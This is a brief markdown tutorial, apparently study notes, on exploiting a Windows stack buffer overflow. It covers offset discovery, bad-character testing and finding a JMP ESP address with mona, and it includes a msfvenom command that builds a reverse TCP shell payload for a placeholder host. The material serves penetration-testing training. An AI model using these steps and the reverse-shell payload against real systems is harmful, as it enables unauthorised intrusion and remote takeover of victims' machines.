# Example

- Generate a pattern :

`/opt/metasploit/tools/exploit/pattern_create.rb -l <size>`

- Insert the pattern into your script.

- Run it

- Then use `pattern_offset.rb` with the value in hex you bring in the registers

- Then to make sur you're right, insert A number of the offset , 4 *B, and the end with C.

- After that, increase the size of the buffer of C to verify that you have enough space to send your shellcode.

- Next step is to analyze which bad characters are not allowed (send bad characters after the 4 B, and analyze it).

- Then, we want to point EIP to ESP to execute our shell. But after each crash, the value of ESP change. So we have to find an address where there's a JMP ESP. Pay attention, to do that, DEP and ASLR have to be not activated, and this address should not contain bad characters.

- Using mona in immunity debugger to find a module : `!mona modules`

- Make sure ASLR is false, there's no null bytes in the base address and DEP is also at false. 

- When you have identified a module, you have to know what's the asm code for jmp esp. Use `nasm_shell` in metasploit tools directory. It's FFE4

- Now in mona : `!mona find -s “\xff\xe4” -m <module>`

- When you find a good address, click on it, copy the address, and click on the icon with a narrow to go to the expression. pay attention to bad char, they don't have to be present at the address

- put a breakpoint on it and modify your payload to redirect EIP to ESP

- pay attention if you want to put your breakpoint, do not run the program before, stay in pause (initial state) 

- Then generate a shell. Example: for a 32 bits system : `msfvenom -p windows/shell_reverse_tcp LHOST=<local ip> LPORT=<local port> -f c EXITFUNC=thread -b <bad chars>`. EXITFUNC=thread to avoid the crash of the application when you launch the script (by default it's EXITPROCESS so it killed the application).

- Modify your script and add your shell. Don't forget to insert nop codes before (\x90)




